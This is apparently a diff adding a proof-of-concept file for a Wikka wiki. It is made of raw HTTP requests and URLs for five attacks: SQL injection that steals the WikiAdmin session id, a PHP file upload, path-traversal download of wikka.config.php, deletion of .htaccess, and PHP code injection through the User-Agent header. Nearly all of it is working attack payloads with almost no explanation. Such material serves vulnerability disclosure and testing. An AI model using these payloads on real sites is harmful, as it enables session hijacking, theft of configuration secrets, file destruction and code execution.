@@ -1,0 +1,62 @@
+SQL injection:
+
+POST /wikka/UserSettings HTTP/1.1
+Host: www.example.com
+Cookie: 96522b217a86eca82f6d72ef88c4c7f4=c3u94bo2csludij3v18787i4p6
+Content-Length: 140
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+action=update&email=test%40test.com&default_comment_display=',email=(SELECT sessionid FROM wikka_sessions WHERE userid='WikiAdmin'),theme='
+
+Arbitrary File Upload:
+
+POST /wikka/test HTTP/1.1
+Host: www.example.com
+Cookie: 96522b217a86eca82f6d72ef88c4c7f4=upjhsdd5rtc0ib55gv36l0jdt3
+Content-Length: 251
+Content-Type: multipart/form-data; boundary=--------1503534127
+Connection: keep-alive
+   
+----------1503534127
+Content-Disposition: form-data; name="file"; filename="test.php.mm"
+Content-Type: application/octet-stream
+ 
+<?php phpinfo(); ?>
+----------1503534127
+Content-Disposition: form-data; name="upload"
+
+Upload
+----------1503534127--
+
+Arbitrary File Download:
+
+http://www.example.com/wikka/test/files.xml?action=download&file=/../../wikka.config.php
+
+
+Arbitrary File Deletion:
+
+POST /wikka/test HTTP/1.1
+Host: www.example.com
+Cookie: 96522b217a86eca82f6d72ef88c4c7f4=2nobpqp3a1bsf3j1ccl0stj6l6
+Content-Length: 16
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+file_to_delete=1
+to set $_SESSION['redirectmessage'] and after he could request an URL like this to delete arbitrary files:
+http://www.example.com/wikka/test/files.xml?action=delete&file=/../../.htaccess
+   
+
+PHP code injection:
+
+POST /wikka/test/addcomment HTTP/1.1
+Host: www.example.com
+Cookie: 96522b217a86eca82f6d72ef88c4c7f4=6l11flsnvef642oajav0ufnp83
+User-Agent: <?php phpinfo(); ?>
+Content-Length: 27
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+  
+body=foo&submit=Add+Comment
+
